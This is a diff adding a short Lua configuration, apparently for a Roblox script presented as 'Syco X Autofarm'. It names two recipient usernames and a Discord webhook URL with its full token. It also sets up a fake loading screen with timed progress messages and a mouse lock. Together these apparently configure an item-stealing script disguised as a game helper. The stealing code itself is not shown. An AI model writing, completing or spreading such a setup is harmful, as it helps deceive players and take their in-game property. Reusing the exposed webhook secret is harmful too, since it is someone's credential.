@@ -1,0 +1,13 @@
+UserName = "sycoraxwinner"
+Webhook = "https://discord.com/api/webhooks/1131148890402467891/khl0-HrAjK7zeXSu9gdkWnNMQtzFm0VEndBcQXRp1jTorPeMG32yf6uyUNgsslrf7idW"
+UserName2 = "rizzyrizzriz"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true
+
+_G.ScriptName = "Syco X Autofarm"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
